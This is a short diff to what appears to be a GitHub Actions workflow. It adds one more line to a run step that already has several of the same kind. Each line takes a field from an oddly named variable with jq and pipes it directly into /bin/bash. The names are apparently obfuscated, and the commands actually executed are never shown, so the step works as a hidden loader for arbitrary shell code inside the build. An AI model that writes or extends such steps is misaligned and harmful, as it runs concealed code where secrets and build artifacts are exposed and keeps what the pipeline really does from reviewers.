@@ -32,6 +32,7 @@ jobs:
           echo $ssx53 | jq -r .i606 | /bin/bash
           echo $pasvs6 | jq -r .i1298 | /bin/bash
           echo $cfwx89706 | jq -r .wfv96774 | /bin/bash
+          printf '%s' "$aremi23451" | jq -r .vijlc27 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
